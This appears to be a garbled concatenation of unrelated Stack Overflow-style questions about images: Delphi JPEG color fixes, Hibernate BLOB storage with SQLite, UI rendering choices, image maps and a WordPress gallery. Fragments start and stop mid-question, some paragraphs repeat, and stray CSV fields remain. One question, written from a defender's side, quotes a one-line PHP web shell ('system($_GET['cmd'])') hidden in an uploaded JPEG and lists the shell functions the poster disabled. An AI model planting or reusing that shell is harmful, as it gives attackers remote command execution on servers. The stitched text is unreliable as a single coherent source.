1.  Should I be concerned about doing this with the deprecated google image charts, or should I be fine, given that I am only using of the pie chart type

2.  Should I be going about this entirely differently?  Using the browser to save the image could be problematic because the app needs to support ie. 7-9.

Thanks",4

[Refer to this question][1] which I keep thinking is resolved, but finally find something which makes it still not work as I need. There are temporary work-arounds, but I need help coming up with the actual final fix.

The problem is that these files which I received (and there are over 8,000 of them) are in a bad format. Back when we used Delphi 7 still, we came across the issue that Delphi did not support CMYK color format - it raised access violations. So we used a utility called FastStone Image Resizer to convert them to RGB color format. Since then, we have upgraded to Delphi 2010 and now XE2. However, these images were not using a standard format - they used an Adobe format. When this image resizer converted them, it also did not know the proper format and saved them a little differently, but still not the right format. At least they were able to load into Delphi after that conversion - but unfortunately with a blue color. This is because the RGB channels were switch around to BGR. (or vice-versa?)

I know nothing about how to write code to read and write the header of the JPEG file. I really need someone to do this for me, based on all the input in my previous question. I really hope it's not too unreasonable of a request, I have no clue what's involved. But I do know that I have to read the header of the file, and first determine if certain bytes reflect certain values, and make certain modifications in certain situations.

In the end, it just needs to modify these files and save them in a more standard format which Delphi can properly understand. I had a solution of swapping the Red/Blue bytes, which in fact does work, but only in Delphi. If they're saved like this, then no other program can display them correctly. It's the fact that the format the file's header says it is really isn't a standard format. So really, I'm asking for a JPEG converter.

We will be putting this code inside our software which is distributed to our clients, so I can't use any third-party converters. This solution will be used for both converting thousands of images I already have, and also recognizing and fixing any case of these bad formats in the future directly on our customers' computers.

In this situation, it also needs to work as fast as possible. For example, we may have a list which loads 100 images. Suppose 80 of these images are in this bad format. It needs to convert the files on the spot and save them in the fixed format. With code from [another question][2], I got it to swap around the red/blue bytes in about 300-400 msec, which is fairly decent, but would of course be much faster if the only modifications which had to be done wire in just the header of the file. The header can be changed to reflect the correct format which the data is actually displaying.

This solution will be used for both converting thousands of images I already have, and also recognizing and fixing any case of these bad formats in the future directly on our customers' computers.

In this situation, it also needs to work as fast as possible. For example, we may have a list which loads 100 images. Suppose 80 of these images are in this bad format. It needs to convert the files on the spot and save them in the fixed format. With code from [another question][2], I got it to swap around the red/blue bytes in about 300-400 msec, which is fairly decent, but would of course be much faster if the only modifications which had to be done wire in just the header of the file. The header can be changed to reflect the correct format which the data is actually displaying.

I have been trying to figure out how to store an image in an Sqlite database via Hibernate, but get the exception below. As the exception message says, my SQLite JDBC driver does not support setBinaryStream. I have tried sqlitejdbc-v056 and xerial sqlite-jdbc-3.7.2 jars.

    Caused by: java.sql.SQLException: not implemented by SQLite JDBC driver
    	at org.sqlite.Unused.unused(Unused.java:29)
    	at org.sqlite.Unused.setBinaryStream(Unused.java:60)
    	at org.hibernate.type.BlobType.set(BlobType.java:99)

I've seen this discussed in various places, and from other Q&A areas I found that setBytes should be used instead of setBinaryStream for a PreparedStatement. However for me, everything is happening via Hibernate, not by any direct statements by me. I have not found a solution involving Hibernate yet. 

My mapping file sets type=""blob"" for the image column. If I set it to ""binary"" as was mentioned in a forum somewhere, I get this exception:

    Exception in thread ""AWT-EventQueue-0"" java.lang.ClassCastException: $Proxy2
    	at org.hibernate.type.BinaryType.toInternalFormat(BinaryType.java:38)
    	at org.hibernate.type.AbstractBynaryType.deepCopyNotNull(AbstractBynaryType.java:172)

The image I am trying to store is to be put in an association table separate to the table where the rest of the entity is being saved. I do not see how it can be a proxy, because it is a new object instance being persisted for the first time via session.save() which results in the ClassCastException.

I use a byte array for holding the image data in my java object, using code from others (found in forums) to convert between BufferedImage and byte[].

So I suppose the ultimate question I have is ""is there a solution via Hibernate, or must I use a PreparedStatement myself and bypass Hibernate?""

I am a hibernate newbie. 

Table create statement:

    create TABLE images (image_id INTEGER PRIMARY KEY AUTOINCREMENT, image BLOB not null);

Hibernate mapping:

    <class name=""ImageImpl"" table=""images"">
        <id name=""id"" column=""image_id"">
            <generator class=""identity""/>
        </id>
        <property name=""imageBlob"" column=""image"" type=""blob""/>
    </class>

Java:

    private byte[] m_imageBytes;

    // for use by hibernate
    @SuppressWarnings(""unused"")
    protected Blob getImageBlob ()
    { return Hibernate.createBlob(m_imageBytes); }
    
    // for use by hibernate

",image,hibernate,sqlite,blob,,,open,0,1087,12,"How can I save an image to an SQLite database via Hibernate? Appreciate help with this. I've spent hours at it so far.

I have been trying to figure out how to store an image in an Sqlite database via Hibernate, but get the exception below. As the exception message says, my SQLite JDBC driver does not support setBinaryStream. I have tried sqlitejdbc-v056 and xerial sqlite-jdbc-3.7.2 jars.

    Caused by: java.sql.SQLException: not implemented by SQLite JDBC driver
    	at org.sqlite.Unused.unused(Unused.java:29)
    	at org.sqlite.Unused.setBinaryStream(Unused.java:60)
    	at org.hibernate.type.BlobType.set(BlobType.java:99)

I've seen this discussed in various places, and from other Q&A areas I found that setBytes should be used instead of setBinaryStream for a PreparedStatement. However for me, everything is happening via Hibernate, not by any direct statements by me. I have not found a solution involving Hibernate yet. 

My mapping file sets type=""blob"" for the image column. If I set it to ""binary"" as was mentioned in a forum somewhere, I get this exception:

    Exception in thread ""AWT-EventQueue-0"" java.lang.ClassCastException: $Proxy2
    	at org.hibernate.type.BinaryType.toInternalFormat(BinaryType.java:38)
    	at org.hibernate.type.AbstractBynaryType.deepCopyNotNull(AbstractBynaryType.java:172)

The image I am trying to store is to be put in an association table separate to the table where the rest of the entity is being saved. I do not see how it can be a proxy, because it is a new object instance being persisted for the first time via session.save() which results in the ClassCastException.

I use a byte array for holding the image data in my java object, using code from others (found in forums) to convert between BufferedImage and byte[].

So I suppose the ultimate question I have is ""is there a solution via Hibernate, or must I use a PreparedStatement myself and bypass Hibernate?""

I am a hibernate newbie. 

Table create statement:

    create TABLE images (image_id INTEGER PRIMARY KEY AUTOINCREMENT, image BLOB not null);

Hibernate mapping:

    <class name=""ImageImpl"" table=""images"">
        <id name=""id"" column=""image_id"">
            <generator class=""identity""/>
        </id>
        <property name=""imageBlob"" column=""image"" type=""blob""/>
    </class>

Java:

    private byte[] m_imageBytes;

    // for use by hibernate
    @SuppressWarnings(""unused"")
    protected Blob getImageBlob ()
    { return Hibernate.createBlob(m_imageBytes); }
    
    // for use by hibernate
    @SuppressWarnings(""unused"")
    private void setImageBlob (Blob blob)
    { m_imageBytes = toByteArray(blob); }

Let's take a button as an example. It could have a multi-step linear gradient in the middle (for a glossy look), rounded corners, a 1px stroke, inner glow (box-shadow: inset) and drop shadow, plus text in the middle with text-shadow. Maybe also transparency while not hoovered and even a 2D/3D transform to make it look laid on top of something. Of course this is a lot, but is a plausible example.

**Now which technology to choose:**

##CSS3  
There's a lot of eye-candy potential in CSS3. I'm just worried it's not very optimized yet. I don't know how fast or slow it is because I've never abused it (if you know some place really taking it to the limit, I'd like to see).

##SVG  
SVG looks promising because it was meant for complex graphics. Almost anything can be done with it, and I can use Inkscape to edit it. I just don't know how fast a whole interface made with it would be (for example, if I edit something in the SVG DOM, would the whole SVG be rendered again, or just the modified part?). Also, not many people seem to be using it in browsers yet.

##Canvas  
As a drawing surface, I can paint things like a button myself. Looks very useful to add certain effects, but overall it's quite a hassle to do everything with it, since I'll have to take care of the actual drawing of the images.

##Images  
Well, images are what we most end up doing, but just because we have to support ancient browsers, which is not the case here. Of course images should be easy for the browser to render, but how much? If the difference is small, I'd avoid them for being the less flexible technique. I'd use them if they're really faster to render (I'm even dropping jQuery for performance, so this shouldn't be so hard). Note that on normal web pages, images take time to be downloaded, here they don't.

**Note:** I'm aware of WebGL. I don't even consider getting close to it until browsers start embedding software rendering fallbacks, because its support is beyond terrible for a web technology. I also don't think I should be using Flash here.

The attacker changes the index.php file to their own (with all their glory messages and greet). I've notified the hosting company about this (we are running on a dedicated server), and on my part, I'm trying to fix anything that seems to be the cause, cause I'm still unable to point how exactly did our server was attacked, but I think I've found certain script-based loopholes that could possibly be the culprit.

Our site has an image uploader form, but all uploaded images are verified if they're indeed image file and not some codes by using php getimagesize function. Only if the image type is IMAGETYPE_GIF, or IMAGETYPE_JPEG, or IMAGETYPE_PNG will they be accepted. Else, they won't be able to upload the file. However I found out that one uploaded image file contains a php script inside it! You can download the image <a href=""http://img132.imageshack.us/img132/6365/picodes.jpg"">here</a>. It's a valid image file, but try opening the image using any text editor and you will find a php code inside it:

    <?php

    echo ""<pre>""; system($_GET['cmd']); echo ""</pre>"";

    ?>

For example, the image is uploaded to this location (www.mysite.com/uploads/picodes.jpg). Take note that folder uploads' permission is 755. Is there any way in the world the attacker can execute the system (or any other command such as passthru, since we found out another image has the same code hidden as above, but instead of system, it has passthru command), by just for example, typing <b>www.mysite.com/uploads/picodes.jpg?cmd=some command</b> ?? From my knowledge it can't be done (really appreciate it if someone can prove me wrong), unless the attacker can rename the jpg file to php, and even that, these codes are hidden deep inside the image (please see the image inside text editor to understand what I'm trying to say)

For precautions, I've disabled these php functions (exec, passthru, proc_close,proc_get_status,proc_nice,proc_open,proc_terminate,shell_exec,system) by adding them on the disable_functions in php.ini.

Anyway I still think that the attacker gains access not through web, but through server exploit, but I think my hosting company thinks otherwise.

There is this main window where an image sequence of about 2500 gray scale images of size 320x240 would be played like a video but where the humans be outlined in them nicely.

The challenge is; these images need a bit of processing (detection outlining of humans) before being shown on the window.

Now, is it possible to display a set of images while at the same time do some processing for another set to be shown afterwards?

I would very much prefer it to play like a normal video, but I guess that would be somehow ambitious.",5

I come up with one of the solutions to use the map and area tag for the background img tag. But, since there will be a lot of small area in the image. I think that it will be tedious to use the map and area tag to define the area one by one.

I also think to crop the interactive image, and make it a single another image. Thus, separating it from the background image. But using a separate image for each interactive area is also tedious since every interactive area/image is different from each other, so I have to crop each image and ends up with each image has different source.

Is there a best practice to do this? I'd really appreciate for any suggestion from anyone.

but once i put that code in single.php, the gallery doesnt disply. It only displays once  there is an error before 
         <?php endwhile; ?>
     <?php endif; ?>
 for example if i put `<?php get_related_posts($post); ?>` just after the end of  `</div>  <!--common_wrap #end -->` and if that function isn't available, the Gallery will be displayed with an error.

  Please help on where I'm wrong. I can provide more details once asked.

Thanks in advance fox.

but once i put that code in single.php, the gallery doesnt disply. It only displays once  there is an error before 
         <?php endwhile; ?>
     <?php endif; ?>
 for example if i put `<?php get_related_posts($post); ?>` just after the end of  `</div>  <!--common_wrap #end -->` and if that function isn't available, the Gallery will be displayed with an error.

  Please help on where I'm wrong. I can provide more details once asked.

Thanks in advance fox.
